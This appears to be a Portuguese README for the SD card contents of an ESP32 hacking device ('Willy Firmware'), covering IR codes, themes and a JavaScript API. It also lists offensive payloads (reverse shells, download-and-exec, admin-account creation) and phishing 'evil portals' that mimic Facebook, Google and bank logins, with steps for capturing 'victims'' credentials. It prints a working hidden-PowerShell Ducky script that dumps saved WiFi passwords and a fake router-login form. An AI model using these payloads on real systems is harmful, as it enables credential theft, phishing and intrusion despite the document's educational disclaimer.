<div align="center">

# 📁 SD Card Files - Willy Firmware

![ESP32](https://img.shields.io/badge/ESP32-WROOM--32-red.svg)
![Arduino](https://img.shields.io/badge/Arduino-IDE-blue.svg)
![C++](https://img.shields.io/badge/C++-17-blue.svg)
![Python](https://img.shields.io/badge/Python-3.9+-yellow.svg)
![WiFi](https://img.shields.io/badge/WiFi-802.11%20a/b/g/n/ac/ax-green.svg)
![Bluetooth](https://img.shields.io/badge/Bluetooth-5.0+-blue.svg)
![NFC](https://img.shields.io/badge/NFC-ISO%2014443-purple.svg)
![RFID](https://img.shields.io/badge/RFID-Mifare-orange.svg)
![IR](https://img.shields.io/badge/IR-38--40kHz-red.svg)
![Sub-GHz](https://img.shields.io/badge/Sub-GHz-315--915MHz-green.svg)
![GPS](https://img.shields.io/badge/GPS-NEO--6M-blue.svg)
![Security](https://img.shields.io/badge/Security-Pentest-red.svg)
![Hacking](https://img.shields.io/badge/Hacking-Tools-red.svg)
![Red Team](https://img.shields.io/badge/Red%20Team-Offensive-red.svg)
![Blue Team](https://img.shields.io/badge/Blue%20Team-Defensive-blue.svg)
![Forensics](https://img.shields.io/badge/Forensics-Forensic-blue.svg)
![Wardriving](https://img.shields.io/badge/Wardriving-Map-green.svg)

[![SD Card](https://img.shields.io/badge/SD%20Card-Required-orange.svg)]()
[![Format](https://img.shields.io/badge/Format-FAT32-blue.svg)]()
[![Size](https://img.shields.io/badge/Min%20Size-4GB-green.svg)]()

<img src="../media/pictures/Willy_hd.png" alt="Willy Logo" width="200"/>

**Arquivos de exemplo e recursos para o cartão SD do Willy - Proprietário**

</div>

---

## 📋 Visão Geral

O cartão SD é essencial para o funcionamento completo do Willy Firmware. Ele permite:

- 💾 **Salvar capturas** (handshakes, códigos IR, dumps NFC)
- 📂 **Carregar payloads** (BadUSB, scripts JavaScript)
- 🗺️ **Log de wardriving** (dados GPS + WiFi)
- 🎨 **Customização** (temas, imagens de fundo)
- 📖 **Bancos de dados** (códigos IR, exploits)

### Requisitos do SD Card

| Especificação | Recomendado |
|---------------|-------------|
| **Capacidade** | 4GB - 32GB |
| **Formato** | FAT32 |
| **Classe** | Class 10 ou superior |
| **Marca** | Samsung, SanDisk, Kingston |

---

## 📂 Estrutura de Diretórios

```
📁 SD Card (FAT32)
│
├── 📁 BadUSB and BlueDucky/     # Payloads HID
│   ├── 📄 windows_recon.txt
│   ├── 📄 windows_wifi_grab.txt
│   ├── 📄 windows_reverse_shell.txt
│   └── ... mais payloads
│
├── 📁 infrared/                  # Bancos de dados IR
│   ├── 📁 ACs/                   # Ar-condicionado
│   │   ├── 📁 LG/
│   │   ├── 📁 Samsung/
│   │   └── ...
│   ├── 📁 TVs/                   # Televisores
│   │   ├── 📁 LG/
│   │   ├── 📁 Samsung/
│   │   ├── 📁 Sony/
│   │   └── ...
│   ├── 📁 Consoles/              # Videogames
│   └── 📁 databases/             # Arquivos JSON
│
├── 📁 interpreter/               # Scripts JavaScript
│   ├── 📄 system_info.js
│   ├── 📄 led_control.js
│   ├── 📄 dino_game.js
│   └── ... mais scripts
│
├── 📁 nfc/                       # Arquivos NFC/RFID
│   ├── 📄 Willy_demo.rfid
│   ├── 📄 rickroll.rfid
│   └── ... mais dumps
│
├── 📁 portals/                   # Evil Portals
│   ├── 📁 en/                    # English
│   │   ├── 📄 facebook.html
│   │   ├── 📄 google.html
│   │   └── ...
│   └── 📁 pt-br/                 # Português
│       ├── 📄 facebook.html
│       ├── 📄 banco.html
│       └── ...
│
├── 📁 pwnagotchi/                # Configs Pwnagotchi
│   ├── 📄 custom_faces.txt
│   └── 📄 pwngridspam.txt
│
├── 📁 reverseshell/              # Reverse Shells
│   ├── 📄 shell.ps1
│   ├── 📄 shell.sh
│   └── ...
│
├── 📁 themes/                    # Temas de Interface
│   ├── 📄 Theme_Builder.html
│   ├── 📁 example/
│   ├── 📁 neon_cyber/
│   └── ... mais temas
│
├── 📁 wifi/                      # Configs WiFi
│   ├── 📄 wardrive_sample.csv
│   ├── 📁 WPS/
│   └── 📁 exploits/
│
└── 📁 WPS/                       # WPS Cracking
    └── 📄 cracked.txt
```

---

## ⌨️ BadUSB e BlueDucky

### 📝 Payloads Disponíveis

#### Windows Payloads

| Arquivo | Descrição | Privilégios |
|---------|-----------|-------------|
| `windows_recon.txt` | Coleta informações do sistema | User |
| `windows_wifi_grab.txt` | Extrai senhas WiFi salvas | Admin |
| `windows_reverse_shell.txt` | Abre shell reverso PowerShell | User |
| `windows_download_exec.txt` | Download e execução de payload | User |
| `windows_privilege_check.txt` | Verifica nível de privilégios | User |
| `windows_clipboard_grab.txt` | Captura área de transferência | User |
| `windows_add_admin.txt` | Cria usuário administrador | Admin |
| `windows_message_box.txt` | Exibe mensagem popup | User |

#### Linux Payloads

| Arquivo | Descrição |
|---------|-----------|
| `linux_recon.txt` | Reconhecimento de sistema |
| `linux_persistence.txt` | Script de persistência |

#### macOS Payloads

| Arquivo | Descrição |
|---------|-----------|
| `macos_recon.txt` | Reconhecimento de sistema |
| `macos_shell.txt` | Terminal reverse shell |

#### Universal Payloads

| Arquivo | Descrição |
|---------|-----------|
| `rickroll.txt` | Rickroll clássico |
| `Willy_t_Best.txt` | Demonstração do Willy |

### 📖 Sintaxe Ducky Script

```d
// Comentários começam com //
DELAY 1000        // Aguarda 1 segundo
GUI r             // Win+R (Windows) ou Cmd+Space (macOS)
DELAY 500         // Aguarda meio segundo
STRING notepad    // Digita "notepad"
ENTER             // Pressiona Enter
DELAY 300         // Aguarda
STRING Hello Willy! // Digita texto
```

#### Comandos Suportados

| Comando | Windows | Linux | macOS |
|---------|:-------:|:-----:|:-----:|
| `GUI` | Win | Super | Command |
| `CTRL` | Ctrl | Ctrl | Ctrl |
| `ALT` | Alt | Alt | Option |
| `SHIFT` | Shift | Shift | Shift |
| `ENTER` | ✅ | ✅ | ✅ |
| `TAB` | ✅ | ✅ | ✅ |
| `STRING` | ✅ | ✅ | ✅ |
| `DELAY` | ✅ | ✅ | ✅ |
| `ARROWS` | ✅ | ✅ | ✅ |

### 🎯 Criando Seus Payloads

#### Template Básico

```d
// Nome: Meu Payload
// Autor: Seu Nome
// Plataforma: Windows
// Versão: 1.0

DELAY 1000
GUI r
DELAY 500
STRING cmd
CTRL-SHIFT ENTER  // Executa como admin
DELAY 1500
ALT y             // Confirma UAC
DELAY 500
STRING whoami
ENTER
```

#### Payload Avançado

```d
// Windows WiFi Password Grabber
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_.ToString().Split(':')[1].Trim() } | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear | Select-String 'Key Content' } | Out-File -FilePath 'C:\temp\wifi.txt'"
ENTER
DELAY 3000
GUI r
DELAY 500
STRING notepad C:\temp\wifi.txt
ENTER
```

---

## 📡 Infravermelho

### 📂 Estrutura IR

```
infrared/
├── 📁 ACs/                    # Ar-condicionado
│   ├── 📁 LG/
│   │   ├── 📄 power.ir        # Liga/Desliga
│   │   ├── 📄 temp_cool.ir    # Modo frio
│   │   └── 📄 temp_heat.ir    # Modo quente
│   ├── 📁 Samsung/
│   ├── 📁 Midea/
│   └── ...
│
├── 📁 TVs/                    # Televisores
│   ├── 📁 LG/
│   ├── 📁 Samsung/
│   ├── 📁 Sony/
│   ├── 📁 TCL/
│   └── ...
│
├── 📁 Consoles/               # Videogames
│   ├── 📁 Xbox/
│   ├── 📁 PlayStation/
│   └── 📁 Nintendo/
│
├── 📁 Audio/                  # Áudio
│   ├── 📁 Bose/
│   ├── 📁 Sonos/
│   └── 📁 JBL/
│
└── 📁 databases/              # Bancos de dados JSON
    ├── 📄 tv_codes.json
    ├── 📄 ac_codes.json
    └── 📄 universal.json
```

### 📋 Formato de Arquivo IR

Os arquivos `.ir` seguem o formato IRremoteESP8266:

```
Protocol: NEC
Address: 0x07
Command: 0x02

Raw: 9000,4500,560,560,560,560,560,1690,560,560,560,...
```

### 🎮 Uso dos Arquivos IR

1. **Navegue até o arquivo**: Menu → IR → Custom IR
2. **Selecione o arquivo**: Use o touchscreen
3. **Envie o código**: Pressione o botão

### 📖 Adicionando Novos Códigos

#### Capturando via IR Reader

1. Menu → IR → Read IR
2. Aponte o controle remoto
3. Pressione o botão desejado
4. Salve no SD card

#### Importando Banco de Dados

1. Baixe o banco de dados IR
2. Copie para `infrared/databases/`
3. Acesse via Menu → IR → Database

---

## 🔧 Interpreter (JavaScript)

### 📂 Scripts Disponíveis

| Script | Categoria | Descrição |
|--------|-----------|-----------|
| `system_info.js` | Sistema | Informações do dispositivo |
| `led_control.js` | Hardware | Controle de LED RGB |
| `calculator_t-embed.js` | Utilidade | Calculadora |
| `crypto-prices.js` | Internet | Preços de criptomoedas |
| `dino_game.js` | Jogo | Jogo do dinossauro |
| `pingpong.js` | Jogo | Pong clássico |
| `snake.js` | Jogo | Jogo da cobrinha |
| `wifi_brute.js` | Segurança | Brute force WiFi |
| `ir_brute.js` | Segurança | Brute force IR |
| `rf_brute.js` | Segurança | Brute force RF |

### 📖 API JavaScript

#### Display

```javascript
// Desenhar na tela
tft.fillScreen(TFT_BLACK);
tft.setTextColor(TFT_WHITE);
tft.setTextSize(2);
tft.setCursor(10, 10);
tft.print("Hello Willy!");
```

#### Input

```javascript
// Verificar touch
if (touch.touched()) {
    let x = touch.getX();
    let y = touch.getY();
    // Processar toque
}
```

#### Hardware

```javascript
// Controlar LED
digitalWrite(LED_PIN, HIGH);
analogWrite(LED_PIN, 128); // PWM

// Leitura analógica
let value = analogRead(SENSOR_PIN);
```

### 🎯 Criando Scripts

#### Template Básico

```javascript
// Nome: Meu Script
// Autor: Seu Nome

function setup() {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE);
    tft.setTextSize(2);
    tft.setCursor(10, 10);
    tft.print("Meu Script");
}

function loop() {
    // Seu código aqui
    delay(100);
}

setup();
while(true) {
    loop();
}
```

---

## 💳 NFC/RFID

### 📂 Arquivos Disponíveis

| Arquivo | Tipo | Descrição |
|---------|------|-----------|
| `Willy_demo.rfid` | Mifare 1K | Dump de demonstração |
| `rickroll.rfid` | Mifare 1K | Tag com URL Rickroll |
| `amex_demo.rfid` | Mifare 1K | Cartão demo |

### 📋 Formato RFID

```
{
    "uid": "04A3B2C1D0E1",
    "atqa": "4400",
    "sak": "08",
    "type": "Mifare Classic 1K",
    "data": [
        "04A3B2C1D0E10804",
        "4400080000000000",
        "..."
    ],
    "keys": {
        "sector0": "FFFFFFFFFFFF",
        "sector1": "A0A1A2A3A4A5"
    }
}
```

### 🎯 Operações NFC

| Operação | Descrição |
|----------|-----------|
| **Read** | Lê dados da tag |
| **Write** | Escreve dados na tag |
| **Emulate** | Emula uma tag salva |
| **Clone** | Clona tag completa |
| **Format** | Formata para NDEF |

---

## 🌐 Evil Portals

### 📂 Portais Disponíveis

#### Inglês (en/)

| Portal | Descrição |
|--------|-----------|
| `facebook.html` | Login Facebook falso |
| `google.html` | Login Google falso |
| `instagram.html` | Login Instagram falso |
| `linkedin.html` | Login LinkedIn falso |
| `microsoft.html` | Login Microsoft falso |
| `twitter.html` | Login Twitter falso |
| `amazon.html` | Login Amazon falso |
| `router_update.html` | Atualização de roteador |

#### Português (pt-br/)

| Portal | Descrição |
|--------|-----------|
| `facebook.html` | Login Facebook falso |
| `google.html` | Login Google falso |
| `instagram.html` | Login Instagram falso |
| `microsoft.html` | Login Microsoft falso |
| `twitter.html` | Login Twitter falso |
| `banco.html` | Portal bancário genérico |
| `router_update.html` | Atualização de roteador |

### 📖 Estrutura HTML

```html
<!DOCTYPE html>
<html>
<head>
    <title>Router Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; }
        .warning { color: red; }
        input { margin: 10px; padding: 8px; }
        button { background: #007bff; color: white; padding: 10px 20px; }
    </style>
</head>
<body>
    <h1>⚠️ Router Update Required</h1>
    <p class="warning">Your router needs a security update.</p>
    <form action="/submit" method="POST">
        <input type="text" name="username" placeholder="Admin Username"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <button type="submit">Update Now</button>
    </form>
</body>
</html>
```

### 🎯 Usando Evil Portals

1. **Configure o portal**:
   - Copie o HTML para `portals/`

2. **Inicie o portal**:
   - Menu → WiFi → Evil Portal
   - Selecione o portal HTML

3. **Aguarde vítimas**:
   - O portal cria um AP falso
   - Vítimas conectam e inserem credenciais
   - Dados são salvos no SD

---

## 🎨 Themes

### 📂 Estrutura de Temas

```
themes/
├── 📄 Theme_Builder.html     # Criador visual de temas
├── 📁 example/               # Tema de exemplo
│   ├── 📄 config.json        # Configurações
│   ├── 📄 background.jpg     # Imagem de fundo
│   └── 📄 preview.png        # Preview
├── 📁 neon_cyber/            # Tema Neon Cyber
│   ├── 📄 config.json
│   ├── 📄 background.png
│   └── 📄 preview.png
└── ... mais temas
```

### 📋 Configuração do Tema

```json
{
    "name": "Neon Cyber",
    "author": "Willy Team",
    "version": "1.0",
    "colors": {
        "background": "#0a0a0a",
        "primary": "#00ff00",
        "secondary": "#00ffff",
        "text": "#ffffff",
        "highlight": "#ff00ff"
    },
    "fonts": {
        "normal": "default",
        "large": "default"
    },
    "images": {
        "background": "background.png",
        "logo": "logo.png"
    }
}
```

### 🎨 Criando Temas

#### Usando Theme Builder

1. Abra `Theme_Builder.html` no navegador
2. Configure cores e imagens
3. Visualize em tempo real
4. Exporte como ZIP
5. Extraia para `themes/seu_tema/`

#### Manualmente

1. Crie pasta em `themes/seu_tema/`
2. Adicione `config.json`
3. Adicione imagens de fundo
4. Copie para o SD card

---

## 📶 WiFi

### 📂 Arquivos WiFi

```
wifi/
├── 📄 wardrive_sample.csv    # Exemplo de wardrive
├── 📁 exploits/              # Exploits IoT
│   ├── 📄 iot_exploits.json  # Base de exploits
│   └── 📄 routers.json       # Vulnerabilidades
└── 📁 portals/               # Portais extras
    └── 📄 session_hijack.html
```

### 📋 Wardriving Log

```csv
MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type
AA:BB:CC:DD:EE:FF,Home_Network,[WPA2-PSK-CCMP][ESS],2026-02-23 15:30:45,6,-45,-23.5505,-46.6333,760,10,WIFI
11:22:33:44:55:66,Office_WiFi,[WPA3-SAE][ESS],2026-02-23 15:31:12,36,-52,-23.5510,-46.6340,760,15,WIFI
```

### 🌐 Upload para Wigle.net

1. Acesse [wigle.net](https://wigle.net)
2. Crie uma conta
3. Vá para "Upload"
4. Selecione o arquivo CSV
5. Aguarde processamento

---

## ⚠️ Avisos Importantes

<div align="center">

| ⚠️ Aviso | 📝 Descrição |
|----------|--------------|
| **Uso Ético** | Todos os arquivos são para fins educacionais |
| **Autorização** | Use apenas em sistemas autorizados |
| **Legalidade** | O uso indevido pode ser crime |
| **Responsabilidade** | Você é responsável por suas ações |

</div>

### 📜 Aviso Legal

> Os arquivos fornecidos neste repositório são **exclusivamente para fins educacionais e de pesquisa**. O uso destes arquivos para atividades ilegais é **estritamente proibido**.
>
> **Não nos responsabilizamos** pelo uso indevido destes materiais. Sempre obtenha **autorização por escrito** antes de realizar qualquer teste de segurança.

---

## 📚 Referências

### Documentação Externa

| Recurso | Link |
|---------|------|
| IRremoteESP8266 | [GitHub](https://github.com/crankyoldgit/IRremoteESP8266) |
| Hak5 Ducky Script | [Docs](https://docs.hak5.org/hak5-usb-rubber-ducky) |
| Wigle.net | [Site](https://wigle.net) |
| PN532 Datasheet | [NXP](https://www.nxp.com/) |
| CC1101 Datasheet | [TI](https://www.ti.com/) |

### Tutoriais

| Tutorial | Descrição |
|----------|-----------|
| BadUSB Guide | Guia completo de HID attacks |
| IR Cloning | Como clonar controles IR |
| NFC Security | Segurança em cartões NFC |
| Wardriving 101 | Introdução ao wardriving |

---

<div align="center">

### 🛡️ Willy Firmware

**[⬆ Voltar ao Topo](#-sd-card-files---willy-firmware)**

*Arquivos proprietários do Willy Firmware - Licença Restrita*

</div>

---

## 📜 Licença

**⚠️ SOFTWARE PROPRIETÁRIO - TODOS OS DIREITOS RESERVADOS**

Este software e seus arquivos associados são propriedade exclusiva da Willy Firmware e são fornecidos sob licença estritamente controlada.

### Termos de Uso

- **Uso Exclusivo**: Este software pode ser utilizado apenas pelo proprietário autorizado
- **Modificação Proibida**: Qualquer modificação, engenharia reversa ou descompilação é estritamente proibida
- **Distribuição Restrita**: Não é permitida a distribuição, cópia ou compartilhamento com terceiros
- **Responsabilidade**: O usuário é o único responsável pelo uso do software

### Limitações de Responsabilidade

A Willy Firmware não se responsabiliza por:

- Qualquer dano direto, indireto, incidental ou consequente resultante do uso do software
- Uso não autorizado ou violação dos termos de licença
- Consequências legais de atividades realizadas com o software

### Direitos Autorais

© 2026 Willy Firmware. Todos os direitos reservados.

### Contato

Para informações sobre licenciamento ou suporte, entre em contato através dos canais oficiais da Willy Firmware.

---

**⚠️ AVISO LEGAL**: O uso deste software implica concordância total com os termos de licença proprietária. Qualquer violação resultará em ações legais cabíveis.
